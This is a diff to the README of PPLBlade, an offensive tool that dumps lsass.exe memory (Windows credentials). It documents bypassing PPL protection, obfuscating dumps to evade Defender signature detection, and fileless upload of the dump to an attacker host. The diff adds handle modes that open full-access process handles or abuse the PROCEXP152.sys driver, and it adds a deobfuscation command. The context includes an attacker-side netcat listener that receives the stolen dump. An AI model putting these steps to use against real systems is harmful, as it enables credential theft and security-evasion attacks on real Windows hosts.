@@ -4,7 +4,7 @@ Protected Process Dumper Tool that support obfuscating memory dump and transferr
 Key functionalities:
 1) Bypassing PPL protection
 2) Obfuscating memory dump files to evade defender signature-based detection mechanisms
-3) Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk(fileless dump)
+3) Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
 
 
 Overview of the techniques, used in this tool can be found here: https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6
@@ -18,6 +18,10 @@ Modes:
 2) Decrypt - Revert obfuscated(--obfuscate) dump file to its original state
 3) Cleanup - Do cleanup manually, in case something goes wrong on execution(Note that the option values should be the same as for the execution, we're trying to clean up)
 4) DoThatLsassThing - Dump lsass.exe
+
+Handle Modes:
+1) Direct - Opens PROCESS_FULL_ACCESS handle directly, using OpenProcess() function
+2) Procexp - Uses PROCEXP152.sys to obtain a handle 
 
 ```
 Usage of PPLBlade.exe:
@@ -40,7 +44,7 @@ Usage of PPLBlade.exe:
   -name string
         Process name of target process
   -network string
-        Method for network transfer (default "raw")
+        Method for network transfer[raw|smb] (default "raw")
   -obfuscate
         Obfuscate dump file
   -pass string
@@ -75,4 +79,7 @@ Attacker host:
 nc -lnp 1234 > lsass.dmp
 python3 deobfuscate.py --dumpname lsass.dmp
 ```
+
+Deobfuscate memory dump:
+`PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade`
 
